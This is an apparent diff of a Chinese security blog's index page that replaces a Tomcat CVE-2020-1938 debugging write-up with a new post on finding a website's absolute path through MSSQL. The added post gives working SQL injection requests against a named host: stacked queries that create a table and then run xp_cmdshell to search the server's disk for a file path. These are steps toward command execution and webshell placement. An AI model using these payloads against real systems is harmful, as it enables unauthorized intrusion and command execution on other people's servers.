@@ -63,21 +63,21 @@
       <div id="middlecontent" title class="global-width sidebar-right">
         <section id="main">
   
-    <article id="post-CVE-2020-1938复现和调试" class="article global-container article-type-post" itemscope itemprop="blogPost">
+    <article id="post-mssql-获取网站绝对路径的一个小技巧" class="article global-container article-type-post" itemscope itemprop="blogPost">
   
     <header class="article-header">
       
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/03/15/CVE-2020-1938复现和调试/">CVE-2020-1938复现和调试</a>
+      <a class="article-title" href="/2020/05/06/mssql-获取网站绝对路径的一个小技巧/">mssql 获取网站绝对路径的一个小技巧</a>
     </h1>
   
 
     </header>
   
   <div class="article-meta">
-    <a href="/2020/03/15/CVE-2020-1938复现和调试/" class="article-date">
-  <time datetime="2020-03-15T15:06:24.000Z" itemprop="datePublished">2020-03-15</time>
+    <a href="/2020/05/06/mssql-获取网站绝对路径的一个小技巧/" class="article-date">
+  <time datetime="2020-05-06T14:30:10.000Z" itemprop="datePublished">2020-05-06</time>
 </a>
     
     
@@ -88,19 +88,22 @@
     
     <div class="article-content article-content-cloud" itemprop="articleBody">
       
-        <h3 id="0x01-文件读取"><a href="#0x01-文件读取" class="headerlink" title="0x01 文件读取"></a>0x01 文件读取</h3><p>漏洞利用场景:<br>AJP协议开启，且在指定tomcat版本范围中<br>可读取文件<br>可包含文件，getshell，需要结合上传漏洞将被包含内容上传</p>
-<h4 id="poc效果图"><a href="#poc效果图" class="headerlink" title="poc效果图"></a>poc效果图</h4><p><img src="https://i.loli.net/2020/03/15/DWSoQHEy8Yjnb4s.png" alt="图片.png"></p>
-<h3 id="0x02-调试分析"><a href="#0x02-调试分析" class="headerlink" title="0x02 调试分析"></a>0x02 调试分析</h3><h4 id="1-了解tomcat启动过程："><a href="#1-了解tomcat启动过程：" class="headerlink" title="1 了解tomcat启动过程："></a>1 了解tomcat启动过程：</h4><p>Tomcat Server处理一个http请求的过程<br><a href="详细">https://www.cnblogs.com/yaowen/p/9083285.html</a></p>
-<p>假设来自客户的请求为：<a href="http://localhost:8080/wsota/wsota_index.jsp" target="_blank" rel="noopener">http://localhost:8080/wsota/wsota_index.jsp</a><br>1) 请求被发送到本机端口8080，被在那里侦听的Coyote HTTP/1.1 Connector获得<br>2) Connector把该请求交给它所在的Service的Engine来处理，并等待来自Engine的回应<br>3) Engine获得请求localhost/wsota/wsota_index.jsp，匹配它所拥有的所有虚拟主机Host<br>4) Engine匹配到名为localhost的Host（即使匹配不到也把请求交给该Host处理，因为该Host被定义为该Engine的默认主机）<br>5) localhost Host获得请求/wsota/wsota_index.jsp，匹配它所拥有的所有Context<br>6) Host匹配到路径为/wsota的Context（如果匹配不到就把该请求交给路径名为””的Context去处理）<br>7) path=”/wsota”的Context获得请求/wsota_index.jsp，在它的mapping table中寻找对应的servlet<br>8) Context匹配到URL PATTERN为*.jsp的servlet，对应于JspServlet类<br>9) 构造HttpServletRequest对象和HttpServletResponse对象，作为参数调用JspServlet的doGet或doPost方法<br>10)Context把执行完了之后的HttpServletResponse对象返回给Host<br>11)Host把HttpServletResponse对象返回给Engine<br>12)Engine把HttpServletResponse对象返回给Connector<br>13)Connector把HttpServletResponse对象返回给客户browser</p>
-<h4 id="2-部署调试环境"><a href="#2-部署调试环境" class="headerlink" title="2 部署调试环境"></a>2 部署调试环境</h4><p>根据类（org.apache.coyote.ajp.AjpProcessor）找到所在jar包</p>
-<p><img src="https://i.loli.net/2020/03/15/TANo5X3gexdDMjC.png" alt="图片.png"></p>
-<h4 id="3-idea调试"><a href="#3-idea调试" class="headerlink" title="3 idea调试"></a>3 idea调试</h4><p>重点的几处下断点，进行调试，略过初始化，NIO等过程<br><img src="https://i.loli.net/2020/03/15/28liaOAQjqCTe9M.png" alt="图片.png"></p>
-<p>可以看到读取的文件路径<br><img src="https://i.loli.net/2020/03/15/FvgWf9AOowPzhm4.png" alt="图片.png"></p>
-<p>serveResource方法下resources.getResource传入路径，以流的方式读取</p>
-<p><img src="https://i.loli.net/2020/03/15/rL284Uvu9ayxkS1.png" alt="图片.png"></p>
-<p>读取文件返回响应数据，红框部分为构造响应头<br><img src="https://i.loli.net/2020/03/15/PQfCyk4B8AbLwhR.png" alt="图片.png"></p>
-<p>io流，读物响应体的数据内容<br><img src="https://i.loli.net/2020/03/15/4Y7odLkElc6XrhB.png" alt="图片.png"></p>
-<p>至此，漏洞的几处关键流程就走的差不多了<br>我比较喜欢这篇文章<br><a href="https://blog.csdn.net/jsj13263690918/article/details/80368757" target="_blank" rel="noopener">https://blog.csdn.net/jsj13263690918/article/details/80368757</a><br>讲的是tomcat的核心原理，其实我在调试代码的就感觉到了里面的几层设计，包括，NIO，Connector，Processor,Service,Wrapper等</p>
+        <p>和同事学到的一个操作，记录一下。</p>
+<p>步骤：</p>
+<p><strong>1 存在sql注入</strong></p>
+<p>创建表</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">GET /get.asp?act_id=52;create+table+gogotest+(tmp+varchar(1000));----&amp;user_name=123 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 360gongfang.com</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line"></span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"></span><br><span class="line">Cookie: ASPSESSIONIDSCSRDDQC=EKFDMMLAFPMPKBFAPLIMPBKI</span><br></pre></td></tr></table></figure></div>
+
+<p>验证</p>
+<p><img src="https://i.loli.net/2020/05/06/EVPRwMjn7aNKd9G.png" alt="图片.png"></p>
+<p><strong>2 获取绝对路径</strong></p>
+<p>获取图片名</p>
+<p><img src="https://i.loli.net/2020/05/06/jpgbihMvAz9KLPa.png" alt="图片.png"></p>
+<p>写入图片路径</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">GET /get.asp?act_id=52;insert+into+gogotest(tmp)+exec+master..xp_cmdshell+&apos;dir+/s+/b+d:\btns-search.png&apos;;----&amp;user_name=123 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 360gongfang.com</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line"></span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"></span><br><span class="line">Cookie: ASPSESSIONIDSCSRDDQC=EKFDMMLAFPMPKBFAPLIMPBKI</span><br></pre></td></tr></table></figure></div>
+
+<p>验证：</p>
+<p><img src="https://i.loli.net/2020/05/06/47AJntalbBFuHTL.png" alt="图片.png"></p>
 
       
     </div>
@@ -115,7 +118,7 @@
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
   </nav>
 
 
@@ -150,7 +153,7 @@
   <div class="widget-box">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li></ul>
     </div>
   </div>
 
@@ -160,6 +163,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2020/05/06/mssql-获取网站绝对路径的一个小技巧/">mssql 获取网站绝对路径的一个小技巧</a>
+          </li>
         
           <li>
             <a href="/2020/03/15/CVE-2020-1938复现和调试/">CVE-2020-1938复现和调试</a>
@@ -175,10 +182,6 @@
         
           <li>
             <a href="/2020/02/11/Activity及Intent/">Activity及Intent</a>
-          </li>
-        
-          <li>
-            <a href="/2020/02/11/Android布局及控件/">Android布局及控件</a>
           </li>
         
       </ul>
